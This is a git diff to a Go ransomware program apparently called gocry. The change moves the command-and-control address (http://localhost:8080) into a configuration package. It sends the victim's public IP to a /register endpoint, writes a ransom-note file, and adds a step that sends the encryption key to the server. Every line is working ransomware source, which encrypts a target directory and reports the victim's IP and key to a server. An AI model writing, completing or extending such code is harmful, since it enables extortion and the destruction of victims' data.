@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/awnumar/memguard"
+	"github.com/nireo/gocry/config"
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/ransomware"
 	"golang.org/x/exp/errors/fmt"
@@ -25,6 +26,8 @@ How to decrypt:
 2. Done.
 `
 
+const serverPath = "http://localhost:8080"
+
 func main() {
 	// safely terminate in case of an interrupt signal
 	memguard.CatchInterrupt()
@@ -35,7 +38,9 @@ func main() {
 		rootToEncrypt = rootToEncrypt[:len(rootToEncrypt)-1]
 	}
 
-	rw, err := ransomware.NewRansomware(rootToEncrypt)
+	config.CreateConfiguration(serverPath, rootToEncrypt, message)
+
+	rw, err := ransomware.NewRansomware()
 	if err != nil {
 		log.Fatalf("error creating a ransomware instance: %s", err)
 	}
@@ -46,8 +51,12 @@ func main() {
 	}
 
 	rw.Data.GetPublicIP()
-	rw.Data.SendToServer("http://localhost:8080/register")
+	rw.Data.SendToServer(config.GetConfig().ServerPath + "/register")
 	if err := rw.CreateRansomInfoFile(message); err != nil {
+		log.Fatal(err)
+	}
+
+	if err := rw.SendKeyToServer(); err != nil {
 		log.Fatal(err)
 	}
 
